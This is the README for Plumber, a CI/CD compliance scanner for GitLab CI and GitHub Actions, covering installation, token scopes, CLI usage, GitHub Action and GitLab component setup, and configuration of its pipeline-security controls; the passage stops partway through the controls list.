
<p align="center">
  <img src="assets/plumber.svg" alt="Plumber">
</p>


<p align="center">
  <b>CI/CD compliance scanner for GitLab and GitHub Actions pipelines</b><br/>
  <sub>One CLI, one <code>.plumber.yaml</code>, one Rego engine — scoped per provider. Reads <code>.gitlab-ci.yml</code> via the GitLab API, and <code>.github/workflows/*.{yml,yaml}</code> locally or via the GitHub API.</sub>
</p>
<p align="center">
  <a href="https://securityscorecards.dev/viewer/?uri=github.com/getplumber/plumber"><img src="https://img.shields.io/ossf-scorecard/github.com/getplumber/plumber?label=OpenSSF%20Scorecard&style=for-the-badge&labelColor=2b2d42&color=4a90d9" alt="OpenSSF Scorecard"></a>
  &nbsp;&nbsp;
  <a href="https://slsa.dev/spec/v1.0/levels#build-l3"><img src="https://img.shields.io/badge/SLSA-Level%203-4a90d9?style=for-the-badge&logo=slsa&logoColor=white&labelColor=2b2d42" alt="SLSA 3"></a>
</p>

<p align="center">
  <a href="https://www.bestpractices.dev/projects/12096"><img src="https://www.bestpractices.dev/projects/12096/badge"></a>
</p>

<p align="center">
  <a href="https://github.com/getplumber/plumber/actions"><img src="https://img.shields.io/github/actions/workflow/status/getplumber/plumber/release.yml?label=Build" alt="Build Status"></a>
  <a href="https://github.com/getplumber/plumber/releases"><img src="https://img.shields.io/github/v/release/getplumber/plumber" alt="Latest Release"></a>
  <img src="https://img.shields.io/github/go-mod/go-version/getplumber/plumber" alt="Go Version">
  <a href="https://github.com/getplumber/plumber/releases"><img src="https://img.shields.io/github/downloads/getplumber/plumber/total?label=Downloads" alt="GitHub Downloads"></a>
  <a href="https://hub.docker.com/r/getplumber/plumber"><img src="https://img.shields.io/docker/pulls/getplumber/plumber" alt="Docker Pulls"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MPL--2.0-blue" alt="License"></a>
</p>

<p align="center">
  <a href="https://getplumber.io">Website</a> •
  <a href="https://r2devops.notion.site/Public-Roadmap-357385fc9ef58064bd14d603ba21104d">Roadmap</a> •
  <a href="https://discord.gg/932xkSU24f">Discord</a> •
  <a href="https://github.com/getplumber/plumber/issues">Issues</a>
</p>

---

## 🤔 What is Plumber?

Plumber is a compliance scanner for CI/CD. It supports two providers:

- **GitLab CI** — reads `.gitlab-ci.yml` (and resolved includes) plus repository settings via the GitLab API.
- **GitHub Actions** — reads `.github/workflows/*.{yml,yaml}` either from a local clone (offline-first) or via the GitHub API in `--github-url` mode (no clone required).

Both providers share **one** Rego policy engine and a **single** `.plumber.yaml` config (per-provider sections). Provider is auto-detected from your git `origin`: `github.com`/`gitlab.com` by host, and any other (corporate) host by looking for a `.github/workflows/` directory (a GitHub-mandated path) — present means GitHub, otherwise GitLab. Plumber prints which provider it picked and why on startup. To override, pass `--provider github|gitlab` (forces the provider, host still auto-detected), or `--gitlab-url` / `--github-url` (also pins a specific host/remote).

Plumber ships **14 GitLab CI controls** and **15 GitHub Actions controls**. See the [GitLab CI controls](#gitlab-ci-controls) and [GitHub Actions controls](#github-actions-controls) sections for the full list of what each flags and how to configure it.

**How does it work?** Plumber connects to your provider (or reads workflow files from disk), normalizes the pipeline into a provider-agnostic IR, evaluates Rego policies against it, and reports findings. You define what's allowed in `.plumber.yaml`. When your local clone matches the analyzed project, GitLab analysis can use your local `.gitlab-ci.yml` (or a [custom path](#custom-ci-configuration-file-path)) so you can validate before push; GitHub analysis reads `.github/workflows/` from your local repo by default and only hits the GitHub API for repo-level data (branch protection, etc.) when scope allows. Both paths report per-control compliance percentages and honor `--threshold` for exit-code gating.

**Token requirements summary:**
- `GITLAB_TOKEN` is required for any GitLab analysis.
- GitHub analysis is **soft-degrade in local-clone mode** (workflow-content controls run without a token; repo-level controls silently abstain) and **token-required in upstream-fetch mode** (`--github-url`). See [Step 3: Authenticate](#step-3-authenticate) for scope guidance.

To analyze GitLab from a GitHub clone (or vice versa), force the provider with `--provider github|gitlab` (host auto-detected) or pass the explicit URL flag (`--gitlab-url …` / `--github-url …`, which also pins the host) — either forces the analyzer regardless of `origin`. `--provider` and the *opposite* provider's URL flag conflict (e.g. `--provider github --gitlab-url`) and error.

<p align="center">
  <img src="assets/component.gif" alt="Plumber Demo" width="700">
</p>

## 🚀 Three Ways to Use Plumber

Choose **one** of these methods:

| Method | Providers | Best for | How it works |
|--------|-----------|----------|--------------|
| **[CLI](#option-1-cli)** | GitLab + GitHub | Quick evaluation, local testing, one-off scans, security-team audits across many repos | Install the binary and run from terminal (or a GitHub Actions / GitLab CI step) |
| **[GitLab CI Component](#option-2-gitlab-ci-component)** | GitLab only | Automated checks on every GitLab pipeline run | Add 2 lines to your `.gitlab-ci.yml` |
| **[GitHub Action](#option-3-github-action)** | GitHub only | Automated checks on every push / PR, findings in the Security tab | Add a `uses: getplumber/plumber@<tag>` step |

---

## 📖 Table of Contents

- [What is Plumber?](#-what-is-plumber)
- [CLI](#option-1-cli)
- [GitLab CI Component](#option-2-gitlab-ci-component)
- [Configuration](#%EF%B8%8F-configuration)
  - [Multi-provider configuration](#multi-provider-configuration)
  - [Available Controls](#available-controls)
    - [GitLab CI controls](#gitlab-ci-controls)
    - [GitHub Actions controls](#github-actions-controls)
- [Artifacts & Outputs](#-artifacts--outputs)
  - [JSON Report](#json-report)
  - [Pipeline Bill of Materials (PBOM)](#pipeline-bill-of-materials-pbom)
  - [CycloneDX SBOM](#cyclonedx-sbom)
  - [Terminal Output](#terminal-output)
- [GitLab Integration](#-gitlab-integration)
  - [Merge Request Comments](#merge-request-comments)
  - [Project Badges](#project-badges)
- [Installation](#-installation)
- [CLI Reference](#-cli-reference)
  - [`plumber config init`](#plumber-config-init)
  - [`plumber explain`](#plumber-explain)
- [Self-Hosted GitLab](#%EF%B8%8F-self-hosted-gitlab)
- [Troubleshooting](#-troubleshooting)
- [See it in action](#-see-it-in-action)
- [Blog Posts & Articles](#-blog-posts--articles)


---

## Option 1: CLI

**Try Plumber in 2 minutes!** No commits, no CI changes, just run it.

> **Runtime prerequisite: `git` on `PATH`.** Plumber shells out to `git` when analysing a local clone to auto-detect the remote URL, repo root and HEAD SHA used for source links. CI runners (GitHub Actions, GitLab Runner) ship with `git` pre-installed, and so does the `getplumber/plumber` Docker image. For local installs on macOS / Linux the system `git` is fine. If `git` is missing, auto-detection degrades silently — you'll need to pass `--gitlab-url` / `--github-url` and `--project` explicitly, and source links will reference the branch name instead of the analysed commit.

### Step 1: Install

Choose **one** of the following:

#### Homebrew

```bash
brew tap getplumber/plumber
brew install plumber
```

#### Mise

```bash
mise use -g github:getplumber/plumber
```

> Requires [mise activation](https://mise.jdx.dev/getting-started.html#activate-mise) in your shell, or run with `mise exec -- plumber`.

#### Direct Download

```bash
# For Linux/MacOs
curl -LO "https://github.com/getplumber/plumber/releases/latest/download/plumber-$(uname -s | tr '[:upper:]' '[:lower:]')-$(uname -m | sed 's/x86_64/amd64/' | sed 's/aarch64/arm64/')"
chmod +x plumber-* && sudo mv plumber-* /usr/local/bin/plumber
```

> 📦 See [Installation](#-installation) for Windows, Docker, or building from source.

### Step 2: Create a Config File

**Interactive minimal config** (recommended for first-time setup):

```bash
plumber config init
```

**Or** generate the full commented template:

```bash
plumber config generate
```

In non-interactive environments (for example CI), use `plumber config generate` to write the default template with comments, then trim or adjust as needed.

This creates `.plumber.yaml` with [default](./.plumber.yaml) compliance rules. You can customize it later.

### Step 3: Authenticate

Plumber needs API access to whichever provider hosts your project. Pick the section matching your remote.

#### GitLab

1. In GitLab, go to **User Settings → Access Tokens** ([direct link](https://gitlab.com/-/user_settings/personal_access_tokens))
2. Create a Personal Access Token with `read_api` + `read_repository` scopes
   * **Project Access Tokens** also work: create one inside your project: **Settings → Access Tokens** with the same scopes and at least **Maintainer** role
3. Export it in your terminal:

> ⚠️ **Important:** The token must belong to a user (or project bot) with **Maintainer** role (or higher) on the project to access branch protection settings and other project configurations.

```bash
export GITLAB_TOKEN=glpat-xxxx
```

GitLab analysis **hard-fails** if `GITLAB_TOKEN` is missing or the token's scope is insufficient — the GitLab API is the only source of project settings, branch protection, etc.

#### GitHub

Auth requirements depend on which mode you run plumber in:

| Mode | Command shape | Auth |
|---|---|---|
| **Local-clone scan** | `plumber analyze` (inside a checked-out repo) | Soft-degrade. Workflow-content controls scan local YAML and need no API access. Action-supply-chain controls (archived repos, advisory database, ref-version mismatch, …) need the API and silently no-op without it. |
| **Upstream-fetch** | `plumber analyze --github-url … --project owner/repo` | **Required.** Without a token, GitHub limits you to 60 requests/hour, which silently produces partial results, so plumber refuses to start in this mode. |

Plumber resolves credentials in this order, automatically:

| Order | Source | Set with |
|---|---|---|
| 1 | `GH_TOKEN` env var | `export GH_TOKEN=ghp_…` |
| 2 | `GITHUB_TOKEN` env var | usually pre-set in GitHub Actions runners |
| 3 | `gh` CLI stored token | `gh auth login` (recommended for local dev) |
| 4 | none | local-clone mode: degraded run, local-only checks fire. Upstream-fetch mode: error with setup instructions. |

Token scope (fine-grained PAT against your target repo):

| Scope | What it unlocks | Without it |
|---|---|---|
| `Contents: Read` | Reads workflow YAML (upstream-fetch mode). Powers all workflow-content controls. | Upstream-fetch fails on the first content request. Local-clone scans are unaffected. |
| `Metadata: Read` | Auto-required by GitHub for any fine-grained PAT. | Token won't function. |
| `Administration: Read` | Reads force-push and code-owner-approval state on protected branches (ISSUE-505). | ISSUE-501 still fires; ISSUE-505 abstains rather than guessing. |

Equivalent on a classic PAT: the single `repo` scope covers all three.

> **Org-owned repos:** if your target repo lives under an organisation, the org's PAT policy may require an org admin to approve new fine-grained-PAT scopes (especially `Administration: Read`). If you can't get that approval, `gh auth login` with your own user account is a working alternative — your user's actual repo permissions apply to the resulting token without going through the PAT-approval gate.

**GitHub Enterprise Server (GHES)**: pair `GH_ENTERPRISE_TOKEN` with `--github-url ghes.example.com` (see Step 4).

To check the resolved auth before running:

```bash
gh auth status              # shows the configured host and token's scope
```

### Step 4: Run Analysis

Plumber auto-detects the provider, URL, and project path from your git remote (when set to `origin`).

#### GitLab

```bash
# Auto-detect from origin:
plumber analyze

# Or specify explicitly:
plumber analyze --gitlab-url https://gitlab.com --project mygroup/myproject
```

#### GitHub (github.com) — local clone

```bash
# Auto-detect from origin:
plumber analyze

# The GitHub path is selected when origin points at github.com.
# No --gitlab-url / --project required.
```

#### GitHub (github.com) — upstream fetch (no local clone)

Symmetric to GitLab's `--gitlab-url + --project`. Useful for security teams auditing many repos without cloning each. **Auth is required in this mode** — see Step 3 above for token sources and scopes.

```bash
export GH_TOKEN=ghp_…   # or `gh auth login`, or GITHUB_TOKEN — see Step 3
plumber analyze --github-url github.com --project owner/repo
plumber analyze --github-url github.com --project owner/repo --branch main
```

In this mode Plumber lists `.github/workflows/` via the GitHub Contents API and runs the same per-control parity output. Repo-side files that need a local checkout (Dockerfile, `dependabot.yml`, `SECURITY.md`) are skipped — the dependent controls produce no findings.

#### GitHub Enterprise Server

```bash
export GH_ENTERPRISE_TOKEN=ghp_…   # or: gh auth login --hostname ghes.example.com
plumber analyze                                                    # local clone: auto-detected, API host taken from the git remote
plumber analyze --provider github                                  # local clone: force GitHub when there are no workflows on disk yet (host still from the remote)
plumber analyze --github-url ghes.example.com                      # local clone: force GitHub + pin the GHES API host explicitly
plumber analyze --github-url ghes.example.com --project owner/repo # remote fetch on GHES
```

In a GHES **local clone**, Plumber classifies the repo as GitHub via the `.github/workflows/` directory (GitHub mandates that path, so it is a reliable signal even though a GHES host name is otherwise indistinguishable from self-hosted GitLab) and uses the git remote host as the API host — so the flagless form just works, mirroring how self-hosted GitLab is auto-detected. When the repo has **no** workflows on disk (e.g. you only want the repository-settings controls), the marker is absent, so force it with `--provider github` (host still taken from the remote) or `--github-url` (which also pins the host).

`--github-url` accepts a bare host (`ghes.example.com`) or a full API path (`ghes.example.com/api/v3`). `--gitlab-url` and `--github-url` are mutually exclusive — pass exactly one to select the provider explicitly.

#### Verifying the run

The output reports a **Plumber score** (letter A–E + points), per-control compliance, and a list of findings. See [Artifacts & Outputs](#-artifacts--outputs) for the schemas.

To see only specific controls during testing:

```bash
plumber analyze --controls actionsMustBePinnedByCommitSha,workflowsMustDeclarePermissions
```

Or to skip noisy ones:

```bash
plumber analyze --skip-controls workflowsMustDeclarePermissions
```

#### Flags that don't apply on GitHub yet

A handful of flags are GitLab-only today. On the GitHub path they are silently ignored — no error, just no effect. They need feature work on the GitHub side before they wire up:

| Flag | Status on GitHub |
|---|---|
| `--mr-comment` | not implemented (no GitHub PR comment integration yet) |
| `--badge` | not implemented (no GitHub repo badge integration yet) |
| `--ci-config-path` | N/A — GitHub workflows always live under `.github/workflows/` |
| `--gitlab-url` | N/A — pass `--github-url` instead, or rely on git-remote auto-detection |

Flags that work identically on both providers (see the [CLI Reference](#-cli-reference) for what each does): `--config`, `--output`, `--pbom`, `--pbom-cyclonedx`, `--sarif`, `--glsast`, `--threshold`, `--print`, `--score`, `--score-point`, `--controls`, `--skip-controls`, `--fail-warnings`, `--branch`, and `--project`.

### Trying it on this repo

If you've cloned this repository and just want to confirm Plumber works against a real GitHub project:

```bash
gh auth login                         # one-time
make build                            # produces ./plumber
./plumber analyze                     # scans .github/workflows here
```

You can disable the API enrichment to speed up local iteration:

```bash
PLUMBER_DISABLE_GITHUB_API=1 ./plumber analyze
```

Both runs read `.plumber.yaml` from the repo root and write findings to stdout. Add `--output analysis.json --pbom pbom.json --pbom-cyclonedx pbom-cyclone.json` to inspect every artifact at once — all three are produced on the GitHub path with the same shape as on GitLab (see the asymmetry table for what remains GitLab-only).

#### Local CI Configuration

When running from your project's git repository, Plumber automatically uses your **local CI configuration file** instead of fetching it from the remote. This lets you validate changes before pushing.

The CI configuration file path is resolved by priority:

1. **`--ci-config-path` is specified** → uses that path (both locally and remotely)
2. **Auto-detected from GitLab project settings** → uses the project's configured CI config path (usually `.gitlab-ci.yml`)

The source of the CI configuration file (local vs. remote) is resolved by priority:

1. **`--branch` is specified** → always uses the remote file from that branch
2. **In a git repo** and the local repo matches the analyzed project → uses the local file
3. **Otherwise** → uses the remote file from the project's default branch

If the local CI configuration is invalid, Plumber exits with an error showing the specific validation messages from GitLab so you can fix issues before pushing.

> **Note:** When using local CI configuration, `include:local` files are also read from your local filesystem. Other include types (components, templates, project files, remote URLs) are always resolved from their remote sources. Jobs from `include:local` files are treated as hardcoded by the analysis since they are project-specific and not from reusable external sources.

#### Custom CI Configuration File Path

Some GitLab projects use a [custom CI/CD configuration file](https://docs.gitlab.com/ci/pipelines/settings/#specify-a-custom-cicd-configuration-file) instead of the default `.gitlab-ci.yml`. Plumber auto-detects this from the GitLab project settings, but you can also override it explicitly with the `--ci-config-path` flag:

```bash
# Analyze a project that uses a custom CI file
plumber analyze --ci-config-path my-custom-ci.yml

# Combine with other flags
plumber analyze --gitlab-url https://gitlab.com --project mygroup/myproject --ci-config-path .gitlab/ci/main.yml
```

In the [GitLab CI Component](#option-2-gitlab-ci-component), use the `ci_config_path` input:

```yaml
include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    inputs:
      ci_config_path: my-custom-ci.yml
```

> 💡 **Like what you see?** Add Plumber to your CI/CD with the [GitLab CI Component](#option-2-gitlab-ci-component) for automated checks on every pipeline.

---

## Option 2: GitLab CI Component

**Add Plumber to your GitLab pipeline**: it will run automatically on the default branch, tags and open merge requests.

> 💬 These instructions are for **gitlab.com**. Self-hosted? See [Self-Hosted GitLab](#%EF%B8%8F-self-hosted-gitlab).

### Step 1: Create a GitLab Token

1. In GitLab, go to **User Settings → Access Tokens** ([or create one here](https://gitlab.com/-/user_settings/personal_access_tokens))
2. Create a Personal Access Token with `read_api` + `read_repository` scopes
   * **Project Access Tokens** also work: create one inside your project: **Settings → Access Tokens** with the same scopes and at least **Maintainer** role
3. Go to your project's **Settings → CI/CD → Variables**
4. Add the token as `GITLAB_TOKEN` (masked recommended)

> ⚠️ **Important:** The token must belong to a user (or project bot) with **Maintainer** role (or higher) on the project to access branch protection settings and other project configurations.
>
> **Using `mr_comment` or `badge`?** The token needs the `api` scope (instead of `read_api`) to create/update merge request comments or project badges.


### Step 2: Add to Your Pipeline

Add this to your `.gitlab-ci.yml`:

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS # prevents duplicate pipelines
      when: never
    - if: $CI_COMMIT_BRANCH
    - if: $CI_COMMIT_TAG

include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    # inputs:
    #   stage: .pre | by default runs in .pre which only runs if there is at least another CI job in another stage
```

* Get the latest version from the [Catalog](https://gitlab.com/explore/catalog/getplumber/plumber)

> **Why `workflow:rules`?** Without it, pushing to a branch with an open merge request creates **two pipelines** - a branch pipeline and an MR pipeline - splitting your jobs between them. The `workflow:rules` block ensures a single pipeline per push: MR pipeline when an MR exists, branch pipeline otherwise. This is the [recommended GitLab pattern](https://docs.gitlab.com/ee/ci/yaml/workflow.html#switch-between-branch-pipelines-and-merge-request-pipelines). If you already have `workflow:rules` in your `.gitlab-ci.yml`, keep yours and just add the `include`.

### Step 3: Run Your Pipeline

That's it! Plumber will now run on every pipeline and report compliance issues.

> 💡 **Want to customize?** See [Configuration](#%EF%B8%8F-configuration) to set thresholds, enable/disable controls, and whitelist trusted images.

---

## Option 3: GitHub Action

Add Plumber to your GitHub Actions workflow with a single step. The action (this repo's root `action.yml`) installs the verified release binary, runs the scan, **fails the job** below your threshold, uploads **SARIF** to Code Scanning (findings appear in the **Security** tab), and attaches the JSON report, PBOM, and CycloneDX SBOM as a workflow artifact.

> **Prerequisite: commit a `.plumber.yaml` to your repo first.** The action scans against the controls defined there. If it's missing, the job fails with `config file not found` — there is no built-in fallback config. Create one before adding the workflow:
> - **Have the Plumber CLI locally?** Run `plumber config generate` (writes the commented default config) or `plumber config init` (interactive wizard), then commit `.plumber.yaml`.
> - **Don't have the CLI?** Download the default config and commit it:
>   ```bash
>   curl -fsSL https://raw.githubusercontent.com/getplumber/plumber/main/.plumber.yaml -o .plumber.yaml
>   ```

```yaml
name: Compliance
on:
  push:
    branches: [main]   # scope to the default branch so a PR push isn't scanned twice
  pull_request: null

permissions:
  contents: read
  security-events: write   # required to upload SARIF to Code Scanning

jobs:
  plumber:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
      - uses: getplumber/plumber@c52a5acff917ba5fe955fa1f61c3d68d9b37e9ad   # v0.3.33
        with:
          threshold: 80
```

> **Pin by commit SHA, not a tag.** Plumber's `actionsMustBePinnedByCommitSha` control flags tag-pinned third-party actions (a tag is mutable; a SHA is not), so pin ours by SHA and keep the version in the trailing comment. Grab the SHA from the [release page](https://github.com/getplumber/plumber/releases), or let Dependabot/Renovate keep it current. (`actions/checkout@v6` is exempt only because `actions` is a default trusted owner.)

Scan a repo **without checking it out** (security-team audit) by setting `project`:

```yaml
      - uses: getplumber/plumber@c52a5acff917ba5fe955fa1f61c3d68d9b37e9ad   # v0.3.33
        with:
          project: some-org/some-repo
          github-token: ${{ secrets.AUDIT_TOKEN }}   # needs repo / Administration:read
```

<details>
<summary><b>All inputs</b></summary>

| Input | Default | Description |
|-------|---------|-------------|
| `version` | `v0.3.33` | Plumber release to install. Defaults to a pinned tag; bump explicitly when upgrading. |
| `verify-attestation` | `true` | Verify the downloaded binary's build-provenance attestation (sigstore/SLSA) against the getplumber/plumber release workflow via the `gh` CLI. Anchors the binary to a trusted build regardless of the mutable release tag. Set `false` for air-gapped / GHES setups without attestation access. |
| `github-token` | `${{ github.token }}` | API token (branch protection, advisory DB) and SARIF upload. `Administration:read` for full `branchMustBeProtected`. |
| `project` | *(checkout)* | `owner/repo` to scan remotely. Default: scan the checked-out repo. |
| `github-url` | `github.com` | GitHub Enterprise Server host. |
| `threshold` | `100` | Minimum compliance %% to pass. |
| `config-file` | *(auto)* | Path to `.plumber.yaml`. Default: repo `.plumber.yaml` (required — the job fails if absent; see the prerequisite above). |
| `controls` / `skip-controls` | — | Run only / skip listed controls (comma-separated, mutually exclusive). |
| `score` | `true` | Show the Plumber letter score + points. |
| `fail-warnings` | `false` | Treat config warnings as errors. |
| `soft-fail` | `false` | Don't fail the job below threshold (still uploads everything). Runtime errors still fail. |
| `upload-sarif` | `true` | Upload SARIF to Code Scanning (needs `security-events: write`). |
| `upload-artifacts` | `true` | Upload report / PBOM / SBOM as a workflow artifact. |
| `output` / `pbom` / `pbom-cyclonedx` / `sarif` | `plumber-report.json` / `plumber-pbom.json` / `plumber-cyclonedx-sbom.json` / `plumber.sarif` | Output paths (set empty to skip). |

**Outputs:** `compliance` (percentage), `passed` (`true`/`false`), `report` (path), `sarif` (path).

</details>

> **Runners:** Linux, macOS, and Windows GitHub-hosted runners are supported (the binary is downloaded per OS/arch and checksum-verified). **GHES:** set `github-url`.

---

## ⚙️ Configuration

### GitLab CI Component Inputs

Override any input to fit your needs:

```yaml
include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    inputs:
      threshold: 80                           # Minimum % to pass (default: 100)
      config_file: configs/my-plumber.yaml    # Custom config path
      verbose: true                           # Debug output
```

> 📦 Find the latest version on the [GitLab CI/CD Catalog](https://gitlab.com/explore/catalog/getplumber/plumber)

<details>
<summary><b>All available inputs</b></summary>

| Input | Default | Description |
|-------|---------|-------------|
| `server_url` | `$CI_SERVER_URL` | GitLab instance URL |
| `project_path` | `$CI_PROJECT_PATH` | Project to analyze |
| `branch` | `$CI_COMMIT_REF_NAME` | Branch to analyze |
| `gitlab_token` | `$GITLAB_TOKEN` | GitLab API token (requires `read_api` + `read_repository`) |
| `threshold` | `100` | Minimum compliance % to pass |
| `config_file` | *(auto-detect)* | Path to config file (relative to repo root) |
| `output_file` | `plumber-report.json` | Path to write JSON results |
| `pbom_file` | `plumber-pbom.json` | Path to write PBOM output |
| `pbom_cyclonedx_file` | `plumber-cyclonedx-sbom.json` | Path to write CycloneDX SBOM (auto-uploaded as GitLab report) |
| `print_output` | `true` | Print text output to stdout |
| `stage` | `.pre` | Pipeline stage for the job. `.pre` runs before all other stages but requires at least one job in a regular stage — if Plumber is the only job in your pipeline, set this to `test` or another stage |
| `image` | `getplumber/plumber:0.1` | Docker image to use |
| `allow_failure` | `false` | Allow job to fail without blocking |
| `verbose` | `false` | Enable debug output |
| `mr_comment` | `false` | Post/update a compliance comment on the merge request (requires `api` scope) |
| `badge` | `false` | Create/update a Plumber compliance badge on the project (requires `api` scope; only runs on default branch) |
| `controls` | — | Run only listed controls (comma-separated). Cannot be used with `skip_controls` |
| `skip_controls` | — | Skip listed controls (comma-separated). Cannot be used with `controls` |
| `fail_warnings` | `false` | Treat configuration warnings (unknown keys) as errors (exit 2) |

</details>

### Configuration File

Generate a default configuration file with:

```bash
plumber config generate

Flags:
  -f, --force           Overwrite existing file
  -o, --output string   Output file path (default ".plumber.yaml")
```

This creates `.plumber.yaml` with sensible [defaults](./.plumber.yaml). Customize it to fit your needs.

### Multi-provider configuration

Plumber uses a **single** root file (`.plumber.yaml`) with per-provider sections. Same control name, different values per platform — the trusted-registry list on GitLab is `registry.gitlab.com/...`, on GitHub it's `ghcr.io/<org>/...`, action-pinning rules apply on GitHub but have no GitLab counterpart, etc.

A realistic monorepo config that scans both providers:

```yaml
version: "2.0"

gitlab:
  controls:
    containerImageMustNotUseForbiddenTags:
      enabled: true
      tags: [latest, dev, main, master]
    containerImageMustComeFromAuthorizedSources:
      enabled: true
      trustedUrls:
        - registry.gitlab.com/security-products/*
        - $CI_REGISTRY_IMAGE:*
    branchMustBeProtected:
      enabled: true
      defaultMustBeProtected: true
      namePatterns: [main, release/*]
      allowForcePush: false
      codeOwnerApprovalRequired: true
      minMergeAccessLevel: 30   # Developer
      minPushAccessLevel: 40    # Maintainer
    securityJobsMustNotBeWeakened:
      enabled: true

github:
  controls:
    actionsMustBePinnedByCommitSha:
      enabled: true
      trustedOwners: [actions, github]
    containerImageMustNotUseForbiddenTags:
      enabled: true
      tags: [latest, dev, main, master]
      containerImagesMustBePinnedByDigest: true
    branchMustBeProtected:
      enabled: true
      defaultMustBeProtected: true
      namePatterns: [main, release/*]
      allowForcePush: false
      codeOwnerApprovalRequired: true
      # GitLab access-level integers don't apply on GitHub (different model);
      # protection presence + force-push + code-owner rules are evaluated.
    workflowsMustDeclarePermissions:
      enabled: true
    workflowMustNotUseDangerousTriggers:
      enabled: true
    workflowMustNotInjectUserInputInScripts:
      enabled: true
    reusableWorkflowsMustNotInheritSecrets:
      enabled: true
    securityJobsMustNotBeWeakened:
      enabled: true
      securityJobPatterns: ["*codeql*", "*trufflehog*", "*gitleaks*", "*-sast", "*scan*"]
```

**Sharing values across providers** uses standard YAML anchors — no Plumber-specific syntax. Useful when a control's knobs are genuinely identical across both:

```yaml
gitlab:
  controls:
    pipelineMustNotUseDockerInDocker: &dind
      enabled: true
      detectInsecureDaemon: true
github:
  controls:
    pipelineMustNotUseDockerInDocker: *dind
```

> **Provider scoping:** a control listed under `gitlab.controls.*` runs only on GitLab analyses; under `github.controls.*` only on GitHub analyses. Cross-provider control names (e.g. `branchMustBeProtected`) are listed under both sections when you want them on both. The validator (`plumber config validate`) flags controls placed under the wrong provider section with a typo suggestion.

#### Upgrading from the legacy flat schema (v1 → v2)

Pre-2026 versions of Plumber used a flat `controls:` block at the root. That schema (now `version: "1.0"`) is auto-converted in memory at load time with a deprecation warning, but you should upgrade your file:

```bash
plumber config migrate            # writes .plumber.yaml.v2 alongside the original
plumber config migrate --in-place # overwrites .plumber.yaml; backs up to .plumber.yaml.bak
```

The migration preserves comments, wraps `controls:` under `gitlab.controls:`, and bumps `version: "2.0"`. See [`docs/plumber-yaml-v2-migration.md`](docs/plumber-yaml-v2-migration.md) for the full guide.

### Available Controls

Plumber ships **14 GitLab CI controls** and **15 GitHub Actions controls** today. They are configured per-provider in [`.plumber.yaml`](./.plumber.yaml) and can be enabled / disabled / tuned independently.

#### GitLab CI controls

Each can be enabled/disabled and customized in [.plumber.yaml](.plumber.yaml):

<details>
<summary><b>1. Container images must not use forbidden tags</b></summary>

Detects container images using mutable tags that are expected to change unexpectedly.

When `containerImagesMustBePinnedByDigest` is set to `true`, this control requires **all** images to be pinned by digest (e.g., `alpine@sha256:...`); unpinned images are reported as ISSUE-103. If you also configure `tags`, forbidden tag matches (ISSUE-102) are evaluated for images that are **not** digest-pinned, so an image like `golangci/golangci-lint:latest` can produce both ISSUE-103 and ISSUE-102. References that are already digest-pinned are not checked against the forbidden tag list. Standard version tags such as `alpine:3.19` or `node:20` are still flagged for digest pinning when strict mode is on, but they only trigger a forbidden-tag finding if they match a configured pattern.

```yaml
containerImageMustNotUseForbiddenTags:
  enabled: true
  tags:
    - latest
    - dev
    - development
    - staging
    - main
    - master
  # When true, ALL images must be pinned by digest; forbidden tag rules still apply when tags are set
  containerImagesMustBePinnedByDigest: false
```

</details>

<details>
<summary><b>2. Container images must come from authorized sources</b></summary>

Ensures container images come from trusted registries only.

```yaml
containerImageMustComeFromAuthorizedSources:
  enabled: true
  trustDockerHubOfficialImages: true
  trustedUrls:
    - docker.io/docker:*
    - gcr.io/kaniko-project/*
    - $CI_REGISTRY_IMAGE:*
    - $CI_REGISTRY_IMAGE/*
    - getplumber/plumber:*
    - docker.io/getplumber/plumber:*
    - registry.gitlab.com/security-products/*
```

</details>

<details>
<summary><b>3. Branch must be protected</b></summary>

Verifies that critical branches have proper protection settings.

```yaml
branchMustBeProtected:
  enabled: true
  defaultMustBeProtected: true
  namePatterns:
    - main
    - master
    - release/*
    - production
    - dev
  allowForcePush: false
  codeOwnerApprovalRequired: false
  minMergeAccessLevel: 30   # Developer
  minPushAccessLevel: 40    # Maintainer
```

</details>

<details>
<summary><b>4. Pipeline must not include hardcoded jobs</b></summary>

Detects jobs that are project-specific rather than coming from reusable external sources (components, templates, project file includes from other repos, remote URLs). This includes jobs defined directly in `.gitlab-ci.yml` as well as jobs from `include:local` files since local includes are just the project's CI config split across files, not reusable external sources.

```yaml
pipelineMustNotIncludeHardcodedJobs:
  enabled: true
```

</details>

<details>
<summary><b>5. Includes must be up to date</b></summary>

Checks if included templates/components have newer versions available.

```yaml
includesMustBeUpToDate:
  enabled: true
```

</details>

<details>
<summary><b>6. Includes must not use forbidden versions</b></summary>

Prevents use of mutable version references for includes that can change unexpectedly.

```yaml
includesMustNotUseForbiddenVersions:
  enabled: true
  forbiddenVersions:
    - latest
    - "~latest"
    - main
    - master
    - HEAD
  defaultBranchIsForbiddenVersion: false
```

</details>

<details>
<summary><b>7. Pipeline must include component</b></summary>

Ensures required GitLab CI/CD components are included in the pipeline. Components that are imported but have their jobs overridden with forbidden CI/CD keywords (e.g., `script`, `image`, `rules`) are flagged as **overridden**. They still count as imported but produce separate issues and reduce compliance to 50% for that component.

There are two ways to define requirements (use one, not both):

**Expression syntax**: a natural boolean expression using `AND`, `OR`, and parentheses:

```yaml
pipelineMustIncludeComponent:
  enabled: true
  # AND binds tighter than OR, so "a AND b OR c" means "(a AND b) OR c"
  required: components/sast/sast AND components/secret-detection/secret-detection

  # With alternatives:
  # required: (components/sast/sast AND components/secret-detection/secret-detection) OR your-org/full-security/full-security
```

**Array syntax**: a list of groups using "OR of ANDs" logic:

```yaml
pipelineMustIncludeComponent:
  enabled: true
  # Outer array = OR (at least one group must be satisfied)
  # Inner array = AND (all components in group must be present)
  requiredGroups:
    - ["components/sast/sast", "components/secret-detection/secret-detection"]
    - ["your-org/full-security/full-security"]
```

</details>

<details>
<summary><b>8. Pipeline must include template</b></summary>

Ensures required templates (project includes) are present in the pipeline. Templates that are imported but have their jobs overridden with forbidden CI/CD keywords (e.g., `script`, `image`, `rules`) are flagged as **overridden**; they still count as imported but produce separate issues and reduce compliance to 50% for that template.

There are two ways to define requirements (use one, not both):

